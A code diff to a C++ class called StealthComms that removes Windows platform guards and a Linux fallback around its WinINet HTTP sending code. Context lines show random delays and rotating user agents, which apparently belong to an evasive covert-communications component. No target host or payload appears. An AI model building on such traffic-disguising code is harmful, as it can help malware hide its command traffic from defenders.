@@ -7,18 +7,14 @@
 #include "utils/TimeUtils.h"
 #include "utils/StringUtils.h"
 #include "utils/SystemUtils.h"
-#include "core/Platform.h"
 #include <memory>
 #include <random>
 #include <algorithm>
 #include <chrono>
 #include <sstream>
 #include <map>
-
-#if PLATFORM_WINDOWS
 #include <wininet.h>
 #pragma comment(lib, "wininet.lib")
-#endif
 
 // Method reliability tracking
 static std::map<std::string, double> s_methodReliability = {
@@ -400,7 +396,6 @@ void StealthComms::AddRandomDelay() {
 }
 
 bool StealthComms::SendHttpRequest(const std::string& endpoint, const std::vector<uint8_t>& data) {
-#if PLATFORM_WINDOWS
     HINTERNET hSession = CreateHttpSession();
     if (!hSession) return false;
     
@@ -408,17 +403,8 @@ bool StealthComms::SendHttpRequest(const std::string& endpoint, const std::vecto
     
     InternetCloseHandle(hSession);
     return success;
-#else
-    // On Linux, use a cross-platform HTTP library or fallback to curl
-    LOG_DEBUG("Windows-specific HTTP implementation, using fallback");
-    if (m_httpComms) {
-        return m_httpComms->SendData(data);
-    }
-    return false;
-#endif
 }
 
-#if PLATFORM_WINDOWS
 HINTERNET StealthComms::CreateHttpSession() {
     std::string userAgent = GenerateRandomUserAgent();
     
@@ -492,7 +478,6 @@ bool StealthComms::SendSecureHttpRequest(HINTERNET hSession, const std::string& 
     
     return success;
 }
-#endif
 
 std::string StealthComms::GenerateRandomUserAgent() const {
     std::vector<std::string> userAgents = {
